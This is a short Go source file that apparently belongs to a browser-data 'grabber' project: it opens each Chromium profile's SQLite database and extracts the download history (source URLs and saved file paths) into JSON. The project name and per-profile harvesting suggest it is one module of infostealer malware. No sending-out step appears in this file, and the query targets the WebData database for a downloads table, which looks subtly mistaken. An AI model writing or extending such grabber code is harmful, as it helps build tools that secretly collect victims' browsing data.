package downloads

import (
	"database/sql"
	"encoding/json"
	"kdot/grabber/browsers/chromium/structs"
)

type Downloads struct {
	Tab_url     string `json:"tab_url"`
	Target_path string `json:"target_path"`
}

func Get(browsersList []structs.Browser) string {
	var downloads []Downloads
	for _, browser := range browsersList {
		for _, profile := range browser.Profiles {
			path := profile.WebData

			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT tab_url, target_path FROM downloads")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var tab_url string
				var target_path string
				row.Scan(&tab_url, &target_path)
				downloads = append(downloads, Downloads{tab_url, target_path})
			}
		}
	}
	jsonData, err := json.MarshalIndent(downloads, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
